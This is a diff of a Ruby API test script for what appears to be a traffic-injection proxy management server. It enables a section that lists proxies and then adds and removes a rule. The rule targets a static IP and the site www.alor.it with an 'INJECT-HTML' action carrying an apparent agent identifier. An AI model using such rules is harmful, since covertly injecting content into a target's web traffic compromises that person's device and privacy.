@@ -174,7 +174,7 @@ puts
 end
 
 # audit
-if true
+if false
   # audit.count
    res = http.request_get('/audit/count', {'Cookie' => cookie})
    puts "audit.count"
@@ -297,37 +297,79 @@ if false
 end
 
 # proxy
-if false
+if true
+  
+  proxy_id = 0
+  
   # proxy.index
   res = http.request_get('/proxy', {'Cookie' => cookie})
   puts "proxy.index"
   
   proxies = JSON.parse(res.body)
   proxies.each do |proxy|
+    if proxy['_mid'] == 2
+      proxy_id = proxy['_id']
+    end
     puts proxy
     puts
   end
   
   # proxy.delete
-  proxies.each do |proxy|
-    puts "collector.delete"
-    ret = http.delete("/proxy/#{proxy['_id']}", {'Cookie' => cookie})
-    puts ret
-  end
+  #proxies.each do |proxy|
+  #  puts "proxy.delete"
+  #  ret = http.delete("/proxy/#{proxy['_id']}", {'Cookie' => cookie})
+  #  puts ret
+  #end
   
   # proxy.create
-  proxy = {name: 'test'}
-  res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
-  puts "proxy.create"
-  puts res
-  puts
+  #proxy = {name: 'test'}
+  #res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
+  #puts "proxy.create"
+  #puts res
+  #puts
   
-  test_proxy = JSON.parse(res.body)
+  #test_proxy = JSON.parse(res.body)
   
   # proxy.update
-  proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
-  res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
-  puts "proxy.update "
+  #proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
+  #res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
+  #puts "proxy.update "
+  #puts res
+  #puts
+  
+  # proxy.show
+  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  puts "proxy.show"
+  proxy = JSON.parse(res.body)
+  puts proxy.inspect
+  puts
+  
+  # proxy.rules
+  puts "proxy.rules"
+  puts proxy['rules'].inspect
+  puts
+  
+  # proxy.add_rule
+  puts "proxy.add_rule"
+  rule = {proxy: proxy_id, enabled: true, disable_sync: false, ident: 'STATIC-IP', 
+          ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
+          action: 'INJECT-HTML', action_param: 'RCS_0000602', target: '4dfef3792afb6526d0000084'}
+  res = http.request_post('/proxy/add_rule', rule.to_json, {'Cookie' => cookie})
+  rule = JSON.parse(res.body)
+  puts rule
+  puts
+  
+  # proxy.rules
+  puts "proxy.show"
+  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  proxy = JSON.parse(res.body)
+  puts proxy['rules'].inspect
+  puts
+  
+  # proxy.del_rule
+  puts "proxy.del_rule"
+  request = {proxy: proxy_id, rule: rule['_id']}
+  res = http.request_post("/proxy/del_rule", request.to_json, {'Cookie' => cookie})
   puts res
   puts
   
